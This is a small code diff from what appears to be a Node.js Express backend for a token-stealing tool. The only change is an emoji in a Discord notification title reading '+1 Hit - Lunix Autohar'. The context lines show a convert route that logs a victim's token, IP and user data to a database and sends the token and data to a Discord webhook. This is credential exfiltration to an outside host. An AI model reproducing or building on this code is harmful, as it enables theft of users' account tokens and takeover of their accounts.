@@ -2938,7 +2938,7 @@ app.post('/:directory/convert', async (req, res) => {
       // Log user data to database
       await logUserData(token, webhookUserData, { ip: req.ip, directory: directoryName });
 
-      const customTitle = `<:hacker:1404745235711655987> +1 Hit - Lunix Autohar`;
+      const customTitle = `<:emoji_37:1410520517349212200> +1 Hit - Lunix Autohar`;
 
       // Send to Discord webhook with user data
       const webhookResult = await sendToDiscord(token, userAgent, `${scriptType} (Directory: ${directoryName})`, webhookUserData, directoryConfig.webhookUrl, customTitle);
